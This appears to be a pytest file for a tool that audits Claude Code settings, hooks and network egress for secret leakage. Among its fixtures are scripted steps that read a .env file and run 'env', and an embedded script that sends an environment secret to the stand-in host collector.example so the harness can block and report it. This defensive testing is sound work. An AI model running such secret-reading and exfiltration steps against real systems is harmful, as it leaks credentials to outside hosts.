"""The parts of the Claude Code check that need no Claude Code: the
settings overrides, the config, the copies of the project's `.claude`
directory, its memory files and the user and managed configuration, the
scripts hooks start, the hooks Claude Code will run, the settings it
skips, the scratch files stored locally, the permission prompt, the
scripted steps, the name stub's answers and the TLS stub, driven by a
small Python flow.

The TLS stub tests need the isolated network. Where it is unavailable they
skip, unless WEIR_TEST_REQUIRE_NETNS is set (CI on Linux sets it), when
they fail.
"""

from __future__ import annotations

import json
import os
import struct
from pathlib import Path
from typing import Any

import pytest

from weir_run import claude_code, config, isolation
from weir_run.check import CheckRun
from weir_run.mock.intercept import answer, question
from weir_run.mock.model import ModelApi
from weir_run.spec import ClaudeCodeSpec, FlowSpec, PlacementSpec, RunSpec, ScriptStep, SpecError

# -- the settings under test ---------------------------------------------------


def test_settings_that_move_the_model_api_or_the_key_are_overridden() -> None:
    settings = {
        "apiKeyHelper": "print-a-key",
        "permissions": {"deny": ["Read(./.env)"]},
        "env": {
            "ANTHROPIC_BASE_URL": "https://gateway.example",
            "ANTHROPIC_AUTH_TOKEN": "x",
            "https_proxy": "http://proxy.example:3128",
            "OTEL_EXPORTER_OTLP_LOGS_ENDPOINT": "https://collector.example",
            "OTEL_EXPORTER_OTLP_PROTOCOL": "grpc",
            "OTEL_LOGS_EXPORT_INTERVAL": "60000",
            "CLAUDE_CODE_ENABLE_TELEMETRY": "1",
            "OTEL_LOG_USER_PROMPTS": "1",
        },
    }
    data, overrides, telemetry = claude_code.apply_settings(settings)
    assert telemetry
    assert data["permissions"] == settings["permissions"]
    assert "apiKeyHelper" not in data
    assert data["env"] == {"CLAUDE_CODE_ENABLE_TELEMETRY": "1", "OTEL_LOG_USER_PROMPTS": "1"}
    named = [o.split(":")[0].split(" ")[0] for o in overrides]
    assert named == [
        "apiKeyHelper",
        "env.ANTHROPIC_AUTH_TOKEN",
        "env.ANTHROPIC_BASE_URL",
        "env.OTEL_EXPORTER_OTLP_LOGS_ENDPOINT",
        "env.OTEL_EXPORTER_OTLP_PROTOCOL",
        "env.OTEL_LOGS_EXPORT_INTERVAL",
        "env.https_proxy",
    ]


def test_settings_that_keep_to_the_mock_are_applied_as_they_are() -> None:
    settings = {
        "permissions": {"allow": ["Bash(npm test)"]},
        "env": {"OTEL_EXPORTER_OTLP_PROTOCOL": "http/json", "OTEL_LOGS_EXPORT_INTERVAL": "500"},
    }
    data, overrides, telemetry = claude_code.apply_settings(settings)
    assert (data, overrides, telemetry) == (settings, [], False)


# -- the config -----------------------------------------------------------------


def _load(tmp_path: Path, text: str) -> RunSpec:
    path = tmp_path / "canary.toml"
    path.write_text(text, encoding="utf-8")
    return config.load(path)


def test_a_claude_code_config_resolves_its_paths_against_the_config(tmp_path: Path) -> None:
    spec = _load(
        tmp_path,
        '[claude_code]\nkey_owner = "gateway"\nproject = "app"\nuser_settings = "me.json"\n'
        'managed_settings = "it/managed.json"\n',
    )
    assert spec.claude_code is not None
    assert spec.claude_code.key_owner == "gateway"
    assert spec.claude_code.project == (tmp_path / "app").resolve()
    assert spec.claude_code.user_settings == (tmp_path / "me.json").resolve()
    assert spec.claude_code.managed_settings == (tmp_path / "it" / "managed.json").resolve()


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ('[claude_code]\nkey_owner = "anthropic"\n[mock]\n', "takes no [mock]"),
        ('[claude_code]\nkey_owner = "anthropic"\nsettings = "s.json"\n', "unknown key"),
        ('[claude_code]\nkey_owner = "anthropic"\ntimeout_seconds = 0\n', "timeout_seconds"),
        ('[claude_code]\nkey_owner = "both"\n', "key_owner"),
    ],
)
def test_a_claude_code_config_is_strict(tmp_path: Path, text: str, message: str) -> None:
    with pytest.raises(SpecError, match=message.replace("[", r"\[").replace("]", r"\]")):
        _load(tmp_path, text)


# -- the scripted model -----------------------------------------------------------

STEPS = (
    ScriptStep("Read", {"file_path": "/p/.env"}),
    ScriptStep("Bash", {"command": "env"}),
    ScriptStep("Read", {"file_path": "/p/config.json"}),
)


def _turn(api: ModelApi, messages: list[dict[str, Any]], tools: list[str]) -> dict[str, Any]:
    request: dict[str, Any] = {
        "messages": messages,
        "tools": [{"name": t, "input_schema": {}} for t in tools],
    }
    body, _ = api.messages(request)
    return json.loads(body)


def test_the_project_claude_directory_is_copied_without_worktrees_or_symlinks(
    tmp_path: Path,
) -> None:
    project = tmp_path / "app"
    source = project / ".claude"
    configuration = {
        "settings.json": '{"permissions": {"deny": ["Read(./.env)"]}}',
        "hooks/block-secrets.sh": "#!/bin/sh\nexit 2\n",
        "commands/review.md": "Review the change.\n",
        "agents/reviewer.md": "---\nname: reviewer\n---\n",
        "skills/deploy/SKILL.md": "---\nname: deploy\n---\n",
        "CLAUDE.md": "Keep secrets out.\n",
    }
    for name, text in configuration.items():
        (source / name).parent.mkdir(parents=True, exist_ok=True)
        (source / name).write_text(text, encoding="utf-8")
    worktree = source / "worktrees" / "feature"
    worktree.mkdir(parents=True)
    (worktree / ".env").write_text("API_TOKEN=fake-worktree-token\n", encoding="utf-8")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("fake-outside-secret\n", encoding="utf-8")
    (source / "linked").symlink_to(outside, target_is_directory=True)
    (source / "commands" / "linked.md").symlink_to(outside / "secret.txt")

    layout = claude_code.Layout(tmp_path / "run")
    claude_code.prepare(ClaudeCodeSpec(key_owner=None, project=project), layout)

    copied = layout.project / ".claude"
    found = {p.relative_to(copied).as_posix() for p in copied.rglob("*") if not p.is_dir()}
    assert found == set(configuration)
    for name, text in configuration.items():
        assert (copied / name).read_text(encoding="utf-8") == text
    assert not (copied / "worktrees").exists()
    assert not any(p.is_symlink() for p in copied.rglob("*"))


def _answered(reply: dict[str, Any]) -> list[dict[str, Any]]:
    use = reply["content"][0]
    result = {"type": "tool_result", "tool_use_id": use["id"], "content": "ok"}
    return [{"role": "assistant", "content": [use]}, {"role": "user", "content": [result]}]


def test_the_script_asks_one_step_per_turn_in_order() -> None:
    api = ModelApi("Done.", "none", STEPS)
    messages: list[dict[str, Any]] = [{"role": "user", "content": "look around"}]
    asked: list[tuple[str, object]] = []
    for _ in range(len(STEPS)):
        reply = _turn(api, messages, ["Bash", "Read"])
        assert reply["stop_reason"] == "tool_use"
        asked.append((reply["content"][0]["name"], reply["content"][0]["input"]))
        messages += _answered(reply)
    assert asked == [(s.tool, s.input) for s in STEPS]
    assert _turn(api, messages, ["Bash", "Read"])["content"] == [{"type": "text", "text": "Done."}]


def test_a_step_whose_tool_is_not_offered_is_never_asked() -> None:
    api = ModelApi("Done.", "none", STEPS)
    messages: list[dict[str, Any]] = [{"role": "user", "content": "look around"}]
    names: list[str] = []
    reply = _turn(api, messages, ["Read"])
    while reply["stop_reason"] == "tool_use":
        names.append(reply["content"][0]["input"]["file_path"])
        messages += _answered(reply)
        reply = _turn(api, messages, ["Read"])
    assert names == ["/p/.env", "/p/config.json"]


# -- the name stub -------------------------------------------------------------------


def _query(name: str, kind: int) -> bytes:
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
    return (
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        + labels
        + b"\0"
        + struct.pack("!HH", kind, 1)
    )


def test_the_name_stub_answers_every_ipv4_lookup_with_loopback() -> None:
    replied = answer(_query("Collector.Example", 1))
    assert replied is not None
    name, reply = replied
    assert name == "collector.example"
    assert reply[:2] == b"\x12\x34" and reply[2] & 0x80
    assert struct.unpack("!H", reply[6:8]) == (1,)
    assert reply.endswith(bytes([127, 0, 0, 1]))


def test_the_name_stub_answers_other_lookups_with_no_address() -> None:
    replied = answer(_query("collector.example", 28))
    assert replied is not None
    assert struct.unpack("!H", replied[1][6:8]) == (0,)


def test_the_name_stub_ignores_what_is_not_a_query() -> None:
    reply = _query("collector.example", 1)
    as_response = reply[:2] + b"\x81\x80" + reply[4:]
    assert question(as_response) is None
    assert answer(b"\0" * 5) is None


# -- the TLS stub -----------------------------------------------------------------------

STUB_FLOW = """
import os, socket, ssl, struct, sys
value = os.environ["APP_KEY"]
query = struct.pack("!HHHHHH", 7, 0x0100, 1, 0, 0, 0)
query += b"".join(bytes([len(p)]) + p.encode() for p in "collector.example".split("."))
query += b"\\0" + struct.pack("!HH", 1, 1)
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.settimeout(5)
udp.sendto(query, ("127.0.0.1", 53))
address = socket.inet_ntoa(udp.recv(512)[-4:])
# Untrusted: the system's authorities only, which never signed the stub's.
trusted = os.environ.get("MODE") == "trusted"
context = ssl.create_default_context(cafile=os.environ["STUB_CA"] if trusted else None)
try:
    with socket.create_connection((address, 443), timeout=5) as raw:
        with context.wrap_socket(raw, server_hostname="collector.example") as tls:
            body = ("key=" + value).encode()
            tls.sendall(b"POST /ingest HTTP/1.1\\r\\nHost: collector.example\\r\\n"
                        b"Content-Type: text/plain\\r\\nContent-Length: "
                        + str(len(body)).encode() + b"\\r\\n\\r\\n" + body)
            print(tls.recv(64).split(b"\\r\\n")[0].decode())
except ssl.SSLError as exc:
    print("tls failed", type(exc).__name__)
"""


def _stub_unavailable() -> str | None:
    try:
        isolation.jail(stub=True).close()
    except isolation.Unavailable as exc:
        return str(exc)
    return None


def _run_stub_flow(
    tmp_path: Path, judge: list[str], mode: str
) -> tuple[CheckRun, str, dict[str, Any]]:
    why = _stub_unavailable()
    if why is not None:
        if os.environ.get("WEIR_TEST_REQUIRE_NETNS"):
            pytest.fail(f"isolation is required here but was unavailable: {why}")
        pytest.skip(f"network isolation is not available on this machine ({why})")
    script = tmp_path / "flow.py"
    script.write_text(STUB_FLOW, encoding="utf-8")
    placement = PlacementSpec("env.APP_KEY", "env", "APP_KEY", required=True)
    spec = RunSpec(placements=(placement,), flows=())
    run = CheckRun(spec, judge, stub=True, require_isolation=True, validate_spec=False)
    try:
        assert run.stub is not None
        env = {"STUB_CA": str(run.stub.ca_file), "MODE": mode}
        flow = FlowSpec("stub", ("{python}", str(script)), tmp_path, timeout_seconds=60, env=env)
        outcome = run.run_flow(flow, env=None)
        stdout = outcome.stdout.read_text(encoding="utf-8")
        run.stop()
        names = dict(run.stub.names)
        run.judge(json_report=True)
        assert run.json_verdict is not None
        report = json.loads(run.json_verdict.stdout)
        return (
            run,
            stdout + outcome.stderr.read_text(encoding="utf-8"),
            {
                "names": names,
                "report": report,
                "direct": dict(run.direct),
            },
        )
    finally:
        run.cleanup()


def test_a_request_to_another_host_is_decrypted_and_judged(
    tmp_path: Path, judge: list[str]
) -> None:
    _, output, seen = _run_stub_flow(tmp_path, judge, "trusted")
    assert "HTTP/1.1 403" in output, output
    assert seen["names"] == {"collector.example": 1}
    # A lookup the stub answered is no direct connection.
    assert seen["direct"] == {}
    hits = [(h["sink"], h["location"]) for h in seen["report"]["hits"]]
    assert ("collector.example (blocked)", "body") in hits
    assert {"kind": "request", "host": "collector.example", "port": 443, "count": 1} in seen[
        "report"
    ]["blocked"]


def test_a_tls_connection_the_flow_does_not_complete_is_a_blocked_connection(
    tmp_path: Path, judge: list[str]
) -> None:
    _, output, seen = _run_stub_flow(tmp_path, judge, "untrusted")
    assert "tls failed" in output, output
    assert seen["report"]["hits"] == []
    assert seen["report"]["blocked"] == [
        {"kind": "connection", "host": "collector.example", "port": 443, "count": 1}
    ]


# -- the independent check's cases ---------------------------------------------


def test_every_provider_switch_endpoint_and_key_helper_is_overridden() -> None:
    moved = {
        **{
            f"CLAUDE_CODE_USE_{p}": "1"
            for p in (
                "BEDROCK",
                "VERTEX",
                "FOUNDRY",
                "MANTLE",
                "ANTHROPIC_AWS",
                "ANTHROPIC_GOOGLE_CLOUD",
                "GATEWAY",
            )
        },
        **{
            f"ANTHROPIC_{name}": "https://elsewhere.example.invalid"
            for name in (
                "FOUNDRY_BASE_URL",
                "FOUNDRY_RESOURCE",
                "FOUNDRY_API_KEY",
                "FOUNDRY_AUTH_TOKEN",
                "BEDROCK_MANTLE_BASE_URL",
                "AWS_BASE_URL",
                "AWS_API_KEY",
                "GOOGLE_CLOUD_BASE_URL",
                "IDENTITY_TOKEN",
            )
        },
    }
    kept = {"CLAUDE_CODE_USE_POWERSHELL_TOOL": "1", "ANTHROPIC_MODEL": "claude-sonnet"}
    helpers = ("awsAuthRefresh", "awsCredentialExport", "gcpAuthRefresh", "otelHeadersHelper")
    settings = {"env": {**moved, **kept}, **{h: "print-a-secret" for h in helpers}}
    data, overrides, _ = claude_code.apply_settings(settings)
    assert data == {"env": kept}
    named = {o.split(":")[0].split(" ")[0] for o in overrides}
    assert named == {*helpers, *(f"env.{name}" for name in moved)}


@pytest.mark.parametrize(
    ("command", "scripts"),
    [
        ("sh -e x.sh", ["x.sh"]),
        ("bash -o pipefail x.sh", ["x.sh"]),
        ("bash --rcfile rc x.sh", ["x.sh"]),
        ("bash -c 'echo hi'", []),
        ("python3 -W ignore x.py", ["x.py"]),
        ("python3 -X dev -u x.py", ["x.py"]),
        ("python3 -m guard", []),
        ("python3 -c 'print(1)'", []),
        ("node -r dotenv/config x.js", ["x.js"]),
        ("node --require=dotenv/config x.js", ["x.js"]),
        ("node --import tsx x.ts", ["x.ts"]),
        ("node -e 'process.exit(0)'", []),
        ("node -p 1", []),
        ("ruby -I lib x.rb", ["x.rb"]),
        ("ruby -e 'exit'", []),
        ("perl -I lib x.pl", ["x.pl"]),
        ("perl -E 'say 1'", []),
        ("php -d display_errors=1 x.php", ["x.php"]),
        ("php -f x.php", ["x.php"]),
        ("php -r 'echo 1;'", []),
        ("deno run -A x.ts", ["x.ts"]),
        ("deno eval 'x'", []),
        ("bun run x.ts", ["x.ts"]),
        ("env FOO=1 python3 x.py", ["x.py"]),
        ("env -u HOME node x.js", ["x.js"]),
        ("exec python3 x.py", ["x.py"]),
        ("./guard.sh && python3 -W ignore y.py", ["./guard.sh", "y.py"]),
        ("/usr/bin/python3 x.py", ["/usr/bin/python3", "x.py"]),
        ("/usr/bin/env python3 x.py", ["/usr/bin/env", "x.py"]),
        ("timeout 5 python3 x.py", ["x.py"]),
        ("timeout -s KILL 5 node x.js", ["x.js"]),
        ("nice -n 5 node x.js", ["x.js"]),
        ("/usr/bin/timeout 5 ./guard.sh", ["/usr/bin/timeout", "./guard.sh"]),
        ('bash -lc "jq -e . >/dev/null"', []),
        ('sh -ec "exit 0"', []),
        ("sh -eo pipefail x.sh", ["x.sh"]),
        ("perl -ne 'print' x.txt", []),
        ("python3 -Bc 'print(1)'", []),
        ("python3 -uW ignore x.py", ["x.py"]),
        ("python3 -Werror x.py", ["x.py"]),
        ("ruby -rjson x.rb", ["x.rb"]),
        ("deno fmt", []),
        ("deno task check", []),
        ("deno run lint", []),
        ("deno x.ts", ["x.ts"]),
        ("deno run -A ./tools/check", ["./tools/check"]),
        ("bun run lint", []),
        ("bun test", []),
        ("bun x prettier", []),
        ("bun x.ts", ["x.ts"]),
        ("node --run lint", []),
        ("node --run ./x.js", ["./x.js"]),
    ],
)
def test_the_script_a_hook_starts_is_found_for_each_interpreter(
    command: str, scripts: list[str]
) -> None:
    assert claude_code.hook_scripts(command) == scripts


def _tree(root: Path, files: dict[str, str]) -> None:
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(text, encoding="utf-8")


def _files(root: Path) -> set[str]:
    return {p.relative_to(root).as_posix() for p in root.rglob("*") if not p.is_dir()}


def _hook_settings(scope: str, path: Path, command: str) -> claude_code.SettingsFile:
    hook = {"type": "command", "command": command}
    data = {"hooks": {"PreToolUse": [{"matcher": "Read", "hooks": [hook]}]}}
    return claude_code.SettingsFile(scope, path, data)


def test_the_project_claude_directory_is_copied_by_an_allow_list_with_its_hook_scripts(
    tmp_path: Path,
) -> None:
    project = tmp_path / "app"
    configuration = {
        "settings.json": "{}",
        "settings.local.json": "{}",
        "rules/secrets.md": "Never read .env.\n",
        "output-styles/terse.md": "Be terse.\n",
    }
    _tree(project / ".claude", configuration)
    _tree(
        project / ".claude",
        {
            "scheduled_tasks.json": "[]",
            "scheduled_tasks.lock": "",
            "agent-memory-local/notes.md": "notes\n",
        },
    )
    _tree(project, {"tools/guard.py": "print('guard')\n", "tools/unused.py": "\n"})
    settings = [
        _hook_settings(
            "project",
            project / ".claude" / "settings.json",
            'python3 "$CLAUDE_PROJECT_DIR"/tools/guard.py',
        )
    ]

    layout = claude_code.Layout(tmp_path / "run")
    claude_code.prepare(ClaudeCodeSpec(key_owner=None, project=project), layout, settings)

    assert _files(layout.project / ".claude") == set(configuration)
    assert (layout.project / "tools" / "guard.py").read_text(encoding="utf-8") == "print('guard')\n"
    assert not (layout.project / "tools" / "unused.py").exists()


def test_the_memory_files_and_the_project_files_they_import_are_copied(tmp_path: Path) -> None:
    project = tmp_path / "app"
    outside = tmp_path / "outside.md"
    outside.write_text("Kept elsewhere.\n", encoding="utf-8")
    _tree(
        project,
        {
            "CLAUDE.local.md": "Local.\n\n@docs/setup.md and @~/notes.md\n",
            "docs/setup.md": "Setup.\n\n@../AGENTS.md\n\n```\n@docs/not-an-import.md\n```\n",
            "AGENTS.md": f"Agents.\n\n@{outside}\n",
            "docs/not-an-import.md": "Not imported.\n",
        },
    )
    (project / "CLAUDE.md").symlink_to(outside)

    layout = claude_code.Layout(tmp_path / "run")
    claude_code.prepare(ClaudeCodeSpec(key_owner=None, project=project), layout)

    assert _files(layout.project) == {
        "CLAUDE.local.md",
        "docs/setup.md",
        "AGENTS.md",
        "README.md",
    }


def test_a_user_and_a_managed_configuration_directory_are_copied_as_configuration_only(
    tmp_path: Path,
) -> None:
    user = tmp_path / "me"
    _tree(
        user,
        {
            "settings.json": "{}",
            "CLAUDE.md": "Mine.\n",
            "hooks/guard.sh": "exit 0\n",
            "commands/ship.md": "Ship it.\n",
            ".credentials.json": '{"fake": true}',
            "history.jsonl": "{}\n",
            "projects/x/session.jsonl": "{}\n",
            "scripts/check.sh": "exit 0\n",
        },
    )
    managed = tmp_path / "policy"
    _tree(
        managed,
        {
            "managed-settings.json": "{}",
            "managed-settings.d/10-base.json": "{}",
            "hooks/audit.sh": "exit 0\n",
            "notes.txt": "not configuration\n",
        },
    )
    settings = [
        _hook_settings("user", user / "settings.json", "~/.claude/scripts/check.sh"),
    ]
    spec = ClaudeCodeSpec(
        key_owner=None, project=tmp_path / "app", user_settings=user, managed_settings=managed
    )
    (tmp_path / "app").mkdir()

    layout = claude_code.Layout(tmp_path / "run")
    claude_code.prepare(spec, layout, settings)

    assert _files(layout.config) == {
        "settings.json",
        "CLAUDE.md",
        "hooks/guard.sh",
        "commands/ship.md",
        "scripts/check.sh",
    }
    assert _files(layout.managed_dir) == {
        "managed-settings.json",
        "managed-settings.d/10-base.json",
        "hooks/audit.sh",
    }


def test_the_settings_of_a_configuration_directory_are_under_test_in_claude_code_s_order(
    tmp_path: Path,
) -> None:
    project = tmp_path / "app"
    _tree(project / ".claude", {"settings.json": "{}", "settings.local.json": "{}"})
    user = tmp_path / "me"
    _tree(user, {"settings.json": "{}"})
    managed = tmp_path / "policy"
    _tree(
        managed,
        {
            "managed-settings.json": "{}",
            "managed-settings.d/20-b.json": "{}",
            "managed-settings.d/10-a.json": "{}",
        },
    )
    spec = ClaudeCodeSpec(
        key_owner=None, project=project, user_settings=user, managed_settings=managed
    )
    found = [(f.scope, f.path) for f in claude_code.settings_under_test(spec)]
    assert found == [
        ("managed", managed / "managed-settings.json"),
        ("managed", managed / "managed-settings.d" / "10-a.json"),
        ("managed", managed / "managed-settings.d" / "20-b.json"),
        ("local", project / ".claude" / "settings.local.json"),
        ("project", project / ".claude" / "settings.json"),
        ("user", user / "settings.json"),
    ]


class _Holders:
    """A ledger that knows one fake value."""

    def holders(self, data: bytes) -> list[str]:
        return ["project/.env"] if b"fake-held-value" in data else []


class _Run:
    ledger = _Holders()

    def safe(self, text: str) -> str:
        return text


def test_files_claude_code_writes_to_its_temporary_directory_are_stored_locally(
    tmp_path: Path,
) -> None:
    layout = claude_code.Layout(tmp_path)
    for directory in (layout.home, layout.project, layout.tmp):
        directory.mkdir()
    (layout.tmp / "tool-output.txt").write_text("fake-held-value\n", encoding="utf-8")
    found = claude_code.stored_locally(layout, _Run())  # type: ignore[arg-type]
    assert found == {"project/.env": ["$TMPDIR/tool-output.txt"]}


def test_the_permission_prompt_speaks_mcp_and_answers_no() -> None:
    from weir_run.mock.prompt import PermissionPrompt

    prompt = PermissionPrompt()

    def call(message: dict[str, Any]) -> tuple[int, Any]:
        status, body, _ = prompt.handle("POST", json.dumps(message).encode())
        return status, json.loads(body) if body else None

    status, reply = call({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
    assert status == 200 and reply["result"]["capabilities"] == {"tools": {}}
    assert call({"jsonrpc": "2.0", "method": "notifications/initialized"}) == (202, None)
    _, tools = call({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
    assert [t["name"] for t in tools["result"]["tools"]] == ["prompt"]
    arguments = {"tool_name": "Bash", "input": {"command": "env"}, "tool_use_id": "toolu_1"}
    _, answer = call(
        {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": "prompt", "arguments": arguments},
        }
    )
    decision = json.loads(answer["result"]["content"][0]["text"])
    assert decision["behavior"] == "deny"
    assert [(a.tool_name, a.tool_use_id) for a in prompt.asked] == [("Bash", "toolu_1")]
    assert prompt.handle("GET", b"")[0] == 405


def test_only_the_hooks_claude_code_will_run_are_checked(tmp_path: Path) -> None:
    def hooks(*files: claude_code.SettingsFile) -> list[str]:
        return [command for _, command in claude_code.active_hooks(files)]

    managed = _hook_settings("managed", tmp_path / "m.json", "managed-hook")
    project = _hook_settings("project", tmp_path / "p.json", "project-hook")
    assert hooks(managed, project) == ["managed-hook", "project-hook"]

    project.data["disableAllHooks"] = True
    assert hooks(managed, project) == ["managed-hook"]

    project.data.pop("disableAllHooks")
    managed.data["allowManagedHooksOnly"] = True
    assert hooks(managed, project) == ["managed-hook"]

    managed.data["disableAllHooks"] = True
    assert hooks(managed, project) == []


def test_a_settings_file_claude_code_skipped_as_invalid_is_read_from_its_debug_log(
    tmp_path: Path,
) -> None:
    layout = claude_code.Layout(tmp_path)
    settings = [
        claude_code.SettingsFile("project", tmp_path / "app" / "settings.json", {}),
        claude_code.SettingsFile("user", tmp_path / "me" / "settings.json", {}),
    ]
    target = layout.settings(settings[0].scope)
    layout.debug_log.parent.mkdir(parents=True, exist_ok=True)
    layout.debug_log.write_text(
        "2026-10-23T10:14:15.850Z [DEBUG] something else\n"
        "2026-10-23T10:14:15.850Z [ERROR] Invalid setting skipped without dialog"
        f" (automated session): {target}: cleanupPeriodDays: Number must be greater than"
        " or equal to 1\n",
        encoding="utf-8",
    )
    skipped = claude_code.skipped_settings(layout, settings)
    assert skipped == {
        settings[0].path: "cleanupPeriodDays: Number must be greater than or equal to 1"
    }


@pytest.mark.parametrize(
    "name", ["managed-settings.json", "managed-settings.d/10-a.json"], ids=["file", "drop-in"]
)
def test_a_managed_settings_file_claude_code_skipped_is_read_by_its_path_in_the_sandbox(
    tmp_path: Path, name: str
) -> None:
    layout = claude_code.Layout(tmp_path / "scratch")
    passed = tmp_path / "policy" / name
    settings = [claude_code.SettingsFile("managed", passed, {})]
    layout.debug_log.parent.mkdir(parents=True, exist_ok=True)
    layout.debug_log.write_text(
        "2026-10-23T10:14:15.850Z [ERROR] Invalid setting skipped without dialog"
        f" (automated session): /etc/claude-code/{name}: cleanupPeriodDays: bad\n",
        encoding="utf-8",
    )
    assert claude_code.skipped_settings(layout, settings) == {passed: "cleanupPeriodDays: bad"}


@pytest.mark.parametrize(
    "program", ["/usr/bin/python3", "/usr/bin/env python3"], ids=["interpreter", "env"]
)
def test_a_script_started_by_an_interpreter_named_by_its_path_is_checked(
    tmp_path: Path, program: str
) -> None:
    layout = claude_code.Layout(tmp_path)
    layout.project.mkdir()
    command = f'{program} "$CLAUDE_PROJECT_DIR"/.claude/hooks/guard.py'
    settings = [_hook_settings("project", tmp_path / "settings.json", command)]
    missing = claude_code.missing_scripts(settings, layout)
    assert [script for _, _, script in missing] == ["$CLAUDE_PROJECT_DIR/.claude/hooks/guard.py"]
